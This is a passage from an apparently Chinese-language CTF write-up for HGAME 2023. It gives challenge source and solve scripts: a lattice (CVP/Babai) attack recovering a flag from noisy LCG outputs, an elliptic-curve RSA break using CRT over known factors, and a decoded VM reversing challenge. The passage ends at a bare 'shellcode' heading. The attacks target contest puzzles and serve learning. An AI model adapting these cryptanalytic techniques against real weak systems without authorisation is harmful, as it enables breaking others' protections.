50950203578354994361315610513551266959950269781536975918067739452703322781262136461179998708211072088404474086467798220706144532224148381271510829548267663443249211239128168392349655417485217454972594178541621955408662590013128456627383586251263636223918550576991196343771124884867502159556208032937741413991195829141833228354805784696915823276377713447619890962480997666973884863789347160089001432191899295995048038319319429663700801032121122044151466335221748044052241246842605454805578609475081989621432480738414494533803970130417704998509253026924606349225650961013107114702787783209828295963353010554141609959867901376063635059690369070659242002151536609836558317405708151126448858160339661965629719496651202942303191146429892916708912057284522183660102322056191387242824428594281657233253440464391298575326194601534487790774328223840303585530511902204784091570768088497905063165859845079430040038050331142613188348194425319965067942281156805588188309870200486602207919980041792302144641229016106909675996790545196714499602798047891991664236956099928400536085489718593309781105091466579136314487893507564800832388162240749321319891708032065460327451915630787431869051515875119763157257225578251619038913897082430107607097099127647042537910277214609154033726860574747657603152556694678320170563563063793477736920474440611810838426384380575983750552779421450622921277408443732792400304113981076069563116461371566106687351561019647692426243514773785841680130210515750850385607559917277320405635139893497670808754890457688131878332855739229593806744329013317355816999208333555411599130763056887452391960095939404485332281859759761456250472001312632572568428730288863840659289291266652418847426610174619536866222563115759344242746491169921826781979989070951598597532006453963857195802234196325355602109633618281052964627897897738941146059658522363553484624799843461843547974930026183225043521982919101399634944895580012472430055651143242514020430564051025603945312285848478878599654096428952417805391030163733234093391333946260295891442928043912309746607549007600923847117959906911920834529880355344146802176584681522800227787793562158590229021382104940933653717667898847980670644184503554868986320551063207294943529486241277183096968784735626714435773822113055393232488560323951630141711800993254496346719300800698676680613130067896410858714print(long_to_bytes(a//b)) LLLCG Revenge题目描述 123456789101112131415161718192021222324from Crypto.Util.number import *from random import randintfrom sage.all import next_primefrom flag import flagclass LCG(): def __init__(self) -&gt; None: self.n = next_prime(2**360) self.a = bytes_to_long(flag) self.seed = randint(1, self.n-1) def next(self): self.seed = (self.seed * self.a + randint(-2**340, 2**340)) % self.n return self.seedlcg = LCG()outputs = []for i in range(40): outputs.append(lcg.next())with open('output.txt', 'w') as f: f.write(str(outputs)) cvp问题 123456789101112131415161718192021222324from Crypto.Util.number import long_to_bytesoutput=[1072682018203555327925119662244845307651030128187638239188481252824704441045779384990260887455033442598048593, 2314688396626907816348951981922244498047525257125198648911598585289195781243621311428428734722999306352061119, 1878430550250179196785659908988356309384108895080459648572663321506487586862412211893692540034053316389122769, 375188073005966957576558668944558585024019277401944476621460520241453733436682837114320899506215820612778012, 1740601933458038408571714940901061894042573269534104610622455786596450579309938700212469253614325841397164626, 2240302364997293339801673638919278393212092190114945661555423503764207618629124969759043539606959348584754988, 1197889025088471452713271710311671860783390404923276895521445988512443134612928822580116266576787184846327319, 976433246957039051923406391525684432974532672076276505389812516911961753933724206796867970452615647769118718, 2043415417033800361129550753544683456060169214233719479382159378983277580824885160245880033681749601883969201, 1984763918799029807638751419395183574986098560422088374841672134542121920061633192468066783651721344114013462, 803323934991809869121110410690579868721603956649556084555774643704720423234525940066213247898221110694661155, 562860304448117793596032009881740849176223397573768843935634452924461109423140979168907236910235449335457185, 1309787661874142397912572420627123766513575319494440163191195202278465655066239655207734483496319738864886962, 799387331117066937071537642286715753443325832220178467932929642483559948552296702665548644355646564414242300, 435895870103290768903875690374192053569964916578820680528075175327491084637138415383245021660882061363762283, 1025844481259412257944752953478915300009685293647809183167084041854676759312695888262621576372363286629672305, 973440543305925828702283689240323693259060329180507330188561496233563434030267185114642244063757575448592154, 1292718969249126780353749729712561553775221894794101215463481964402196628245800785961439477450167809419110539, 478182294059469466905772721706884436001530957529397292986252169155570524778049686857846815729987813954732342, 375768709824343867177569674956240962127398373290167902349550708257924670715620362106926070669866315490327994, 737801845896333377781281959135960913727635869063347917031983291772056771910393840245037591877610657770830161, 348428691088064627130781690576475639268867488610621247856232777135056288575397902640759510766842015263274144, 1680702650416119838851788530479104078574412867692355094948457303860721150742922784797664370220672127535873755, 1033666255241064563800331663210492239063836760152485449704171396333630383760186494767846933371803246651254287, 2195508712891949305134457456528675798684502680332628491731480049292987455664470349101876245955005804056241307, 507520398206401483765111807616037549888407052916445833246479233401436248719221201756446720114940744005195519, 1046312245170954879242738591242143286409643084469319889267777122854632529652359220486460828162882633623043124, 1155453102297910649379292354062492377848897700844120804529504153098915369986534818999863690577330586990362930, 208279328557739771674397767833776203481724359035216407148500638232582951469697944759450872995381845733757054, 2346021407760011280060793630292956804356476368714399605579741704394167646143874988793076456804606169981645561, 2343205576546650272689476334210339527067780073646977745921112918236700694729730722103534235552988655079818293, 1782546718519449609146423091952204048104745357157493303680021137276022324746722411063399856638972831355565363, 1979496865227394742906841121954589136341588203768081740061582015284984831504020263082173777402469126640383916, 1349903401857361378116481737373348780088595771193014212794238119897598994450765597137155947217039410249545128, 1406938386834683546843935538906881880431881650891210824607115874008384343745694306223673166864514314067157223, 1992870407049230676015521975934845717357616500854268872036224279985284147464779084882322526483890974640424282, 1293456202398703621860849046442931998590180253861731810212837938545236005160913894478067431208978448403956057, 2312092791353497885700354375745181236063423592580471640202110350040708979959048453212739514986781413342677758, 1398359779972935198719703490700934330143266041792104397712389202850596464761935545044958311476816387155166661, 1035666501005308054522756757046586007464549186661882989265232284053396181385069582816427863101169570469156725]t=[]u=[]p=2348542582773833227889480596789337027375682548908319870707290971532209025114608443463698998384768703031935081k=19for i in range(len(output)-1): t.append(output[i]) u.append(output[i+1])M = Matrix(RationalField(), 40, 40)def babai(A, w): A = A.LLL(delta=0.75) G = A.gram_schmidt()[0] t = w for i in reversed(range(A.nrows())): c = ((t * G[i]) / (G[i] * G[i])).round() t -= A[i] * c return w - tfor i in range(39): M[i,i]=p M[39,i]=t[i]M[39,39]=1/(2**(k+1))closest=babai(M,vector(u+[0]))print(long_to_bytes((closest[-1] * (2 ** (k + 1))) % p)) ECRSA题目描述 1234567891011121314151617181920212223242526272829from sage.all import *from sage.all_cmdline import *from Crypto.Util.number import *from secret import flagNbits = 512x = bytes_to_long(flag)f = open('./output', 'w')def gen_pubkey(Nbits): p = getPrime(Nbits // 2) q = getPrime(Nbits // 2) n = p*q while True: a = getRandomInteger(Nbits // 2) b = getRandomInteger(Nbits // 2) if gcd(4*a**3 + 27*b**2, n) == 1: break E = EllipticCurve(Zmod(n), [a, b]) e = getPrime(64) f.write(f&quot;p={p}\\nq={q}\\n&quot;) return n, E, en, E, e = gen_pubkey(Nbits)pt = E.lift_x(Integer(x))ct = pt * ef.write(f&quot;n = {n}\\na = {E.a4()}\\nb = {E.a6()}\\ne = {e}\\n&quot;)f.write(f&quot;ciphertext = {long_to_bytes(int(ct.xy()[0]))}\\n&quot;) 题目中的点ct满足 y^2\\equiv x^3+ax+b\\ mod\\ n等价于 \\begin{equation} \\begin{cases} y^2\\equiv x^3+ax+b\\ mod\\ p\\\\ y^2\\equiv x^3+ax+b\\ mod\\ q \\end{cases} \\end{equation}即可以把原题的椭圆$E$分解为两个子椭圆$E_1:y^2\\equiv x^3+ax+b\\ mod\\ p$和$E_2:y^2\\equiv x^3+ax+b\\ mod\\ q$，通过求$e$对每个子椭圆的阶数$E_1.order()\\ E_2.order()$的逆，即可得到点$pt$在每个子椭圆上的值，再结合中国剩余定理即可得到flag 123456789101112131415161718192021from Crypto.Util.number import *import gmpy2p=115192265954802311941399019598810724669437369433680905425676691661793518967453q=109900879774346908739236130854229171067533592200824652124389936543716603840487n = 12659731371633323406361071735480743870942884407511647144758055911931321534333057725377899993936046070028289182446615763391740446071787318153462098556669611a = 34573016245861396068378040882622992245754693028152290874131112955018884485688b = 103282137133820948206682036569671566996381438254897510344289164039717355513886e = 11415307674045871669ciphertext = b'f\\xb1\\xae\\x08`\\xe8\\xeb\\x14\\x8a\\x87\\xd6\\x18\\x82\\xaf1q\\xe4\\x84\\xf0\\x87\\xde\\xedF\\x99\\xe0\\xf7\\xdcH\\x9ai\\x04[\\x8b\\xbbHR\\xd6\\xa0\\xa2B\\x0e\\xd4\\xdbr\\xcc\\xad\\x1e\\xa6\\xba\\xad\\xe9L\\xde\\x94\\xa4\\xffKP\\xcc\\x00\\x907\\xf3\\xea'E1 = EllipticCurve(Zmod(p), [a, b])p1=E1.lift_x(Integer(bytes_to_long(ciphertext)))e_inv=gmpy2.invert(e,E1.order())p2=e_inv*p1E2=EllipticCurve(Zmod(q), [a, b])p1=E2.lift_x(Integer(bytes_to_long(ciphertext)))e_inv=gmpy2.invert(e,E2.order())p2_=e_inv*p1print(p2_[0])print(long_to_bytes(crt([Integer(p2[0]),Integer(p2_[0])],[p,q]))) Reversevm给了提示就好做多了 123456789101112131415161718192021222324252627282930313233343536373839opt=[ 0x00, 0x03, 0x02, 0x00, #a1-&gt;reg[2]=0 0x03, 0x00, 0x02, 0x03, #a1-&gt;reg[2]+=a1-&gt;reg[3] 0x00, 0x00, 0x00, 0x00, #a1-&gt;reg[0]=input[a1-&gt;reg[2]] 0x00, 0x02, 0x01, 0x00, #a1-&gt;reg[1]=a1-&gt;reg[0] 0x00, 0x03, 0x02, 0x32, #a1-&gt;reg[2]=0x32 0x03, 0x00, 0x02, 0x03, #a1-&gt;reg[2]+=a1-&gt;reg[3] 0x00, 0x00, 0x00, 0x00, #a1-&gt;reg[0]=input[a1-&gt;reg[2]] (0x9b) 0x03, 0x00, 0x01, 0x00, #a1-&gt;reg[1]+=a1-&gt;reg[0] 0x00, 0x03, 0x02, 0x64, #a1-&gt;reg[2]=0x64 0x03, 0x00, 0x02, 0x03, #a1-&gt;reg[2]+=a1-&gt;reg[3] 0x00, 0x00, 0x00, 0x00, #a1-&gt;reg[0]=input[a1-&gt;reg[2]] (0xc9) 0x03, 0x03, 0x01, 0x00, #a1-&gt;reg[1]^=a1-&gt;reg[0] 0x00, 0x03, 0x00, 0x08, #a1-&gt;reg[0]=0x8 0x00, 0x02, 0x02, 0x01, #a1-&gt;reg[2]=a1-&gt;reg[1] 0x03, 0x04, 0x01, 0x00, #a1-&gt;reg[1]&lt;&lt;=a1-&gt;reg[0] 0x03, 0x05, 0x02, 0x00, #a1-&gt;reg[2]&gt;&gt;=a1-&gt;reg[0] 0x03, 0x00, 0x01, 0x02, #a1-&gt;reg[1]+=a1-&gt;reg[2] 0x00, 0x02, 0x00, 0x01, #a1-&gt;reg[0]=a1-&gt;reg[1] 0x01, 0x00, #stack[++sp]=a1-&gt;reg[0] 0x00, 0x03, 0x00, 0x01, #a1-&gt;reg[0]=1 0x03, 0x00, 0x03, 0x00, #a1-&gt;reg[3]+=a1-&gt;reg[0] 0x00, 0x02, 0x00, 0x03, #a1-&gt;reg[0]=a1-&gt;reg[3] 0x00, 0x03, 0x01, 0x28, #a1-&gt;reg[1]=0x28 0x04, #a1-&gt;reg[0]==a1-&gt;reg[1]? ##长度判断 0x06, 0x5F, 0x05, 0x00, #相等jump0x5f，不相等jump0x5 0x00, 0x03, 0x03, 0x00, #a1-&gt;reg[3]=0 0x02, 0x01, # a1-&gt;reg[1]=stack[a1-&gt;sp--] 0x00, 0x03, 0x02, 0x96, #a1-&gt;reg[2]=0x96 0x03, 0x00, 0x02, 0x03, #a1-&gt;reg[2]+=a1-&gt;reg[3] 0x00, 0x00, 0x00, 0x00, #a1-&gt;reg[0]=input[a1-&gt;reg[0]] 0x04, #a1-&gt;reg[0]==a1-&gt;reg[1] 0x07, 0x88, #不相等则结束 0x00, 0x03, 0x00, 0x01, #a1-&gt;reg[0]=1 0x03, 0x00, 0x03, 0x00, #a1-&gt;reg[3]+=a1-&gt;reg[0] 0x00, 0x02, 0x00, 0x03, #a1-&gt;[0]=a1-&gt;reg[3] 0x00, 0x03, 0x01, 0x28, # 0x04, 0x07, 0x63, 0xFF, 0xFF] 12345678910111213141516input=[0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9b, 0xa8, 0x2, 0xbc, 0xac, 0x9c, 0xce, 0xfa, 0x2, 0xb9, 0xff, 0x3a, 0x74, 0x48, 0x19, 0x69, 0xe8, 0x3, 0xcb, 0xc9, 0xff, 0xfc, 0x80, 0xd6, 0x8d, 0xd7, 0x72, 0x0, 0xa7, 0x1d, 0x3d, 0x99, 0x88, 0x99, 0xbf, 0xe8, 0x96, 0x2e, 0x5d, 0x57, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc9, 0xa9, 0xbd, 0x8b, 0x17, 0xc2, 0x6e, 0xf8, 0xf5, 0x6e, 0x63, 0x63, 0xd5, 0x46, 0x5d, 0x16, 0x98, 0x38, 0x30, 0x73, 0x38, 0xc1, 0x5e, 0xed, 0xb0, 0x29, 0x5a, 0x18, 0x40, 0xa7, 0xfd, 0xa, 0x1e, 0x78, 0x8b, 0x62, 0xdb, 0xf, 0x8f, 0x9c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4800, 0xf100, 0x4000, 0x2100, 0x3501, 0x6400, 0x7801, 0xf900, 0x1801, 0x5200, 0x2500, 0x5d01, 0x4700, 0xfd00, 0x6901, 0x5c00, 0xaf01, 0xb200, 0xec01, 0x5201, 0x4f01, 0x1a01, 0x5000, 0x8501, 0xcd00, 0x2300, 0xf800, 0xc00, 0xcf00, 0x3d01, 0x4501, 0x8200, 0xd201, 0x2901, 0xd501, 0x601, 0xa201, 0xde00, 0xa601, 0xca01, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]print(hex(input[0x32]))print(hex(input[0x64]))print(opt[0x5f:])num1=input[0x32:0x64]num2=input[0x64:0x96]cip=input[0x96:0x96+40]flag=''for i in range(40): n=(cip[39-i]&gt;&gt;8)+((cip[39-i]&amp;0xff)&lt;&lt;8) n^=num2[i] n-=num1[i] flag+=chr(n)print(flag) shellcode","link":"/2023/02/08/HGAME2023WP/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"DES","slug":"DES","link":"/tags/DES/"},{"name":"RE","slug":"RE","link":"/tags/RE/"},{"name":"CopperSmith","slug":"CopperSmith","link":"/tags/CopperSmith/"},{"name":"NTRU","slug":"NTRU","link":"/tags/NTRU/"},{"name":"HWS","slug":"HWS","link":"/tags/HWS/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"Reverse","slug":"Reverse","link":"/tags/Reverse/"},{"name":"angr","slug":"angr","link":"/tags/angr/"},{"name":"参考资料","slug":"参考资料","link":"/tags/%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/"},{"name":"预备知识","slug":"预备知识","link":"/tags/%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"},{"name":"汇编语言","slug":"汇编语言","link":"/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}],"categories":[]}